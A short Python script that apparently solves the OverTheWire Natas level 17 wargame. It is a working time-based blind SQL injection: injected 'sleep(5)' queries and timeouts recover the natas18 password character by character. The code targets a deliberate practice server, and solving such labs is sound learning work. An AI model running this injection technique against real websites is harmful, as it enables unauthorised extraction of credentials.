#!/bin/python
import requests
import string

url = 'http://natas17.natas.labs.overthewire.org/index.php'
username = 'natas17'
password = '' # password for natas17 goes here

# the uri-encoded query is username=natas18" and password like binary '%<test-val>%' and sleep(5) #
q_param = 'username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%285%29+%23'
headers = {'content-type': 'application/x-www-form-urlencoded'}  

pw_chars = []
all_chars = ''.join([string.ascii_letters,string.digits])

for char in all_chars:
	query = ''.join([url, '?', q_param.format(char)])
	try:
		response = requests.get(query, auth=(username, password), timeout=2, headers=headers)
	except requests.exceptions.Timeout:
		print("Found char ", char)
		pw_chars.append(char)

pw_list = []
pw = ''

# slightly different query: username=natas18" and password like binary '<test-val>%' and sleep(5) #
# because now we're trying to determine the field's value from left to right.
q_param = 'username=natas18%22+and+password+like+binary+%27{0}%25%27+and+sleep%285%29+%23'

for i in range(1,64):
	for char in pw_chars:
		test = ''.join([pw, char])
		query = ''.join([url, '?', q_param.format(test)])
		try:
			response = requests.get(query, auth=(username, password), timeout=2, headers=headers)
		except requests.exceptions.Timeout:
			pw_list.append(char)
			pw = ''.join(pw_list)
			print("Password so far:", pw)

print("Password:", pw)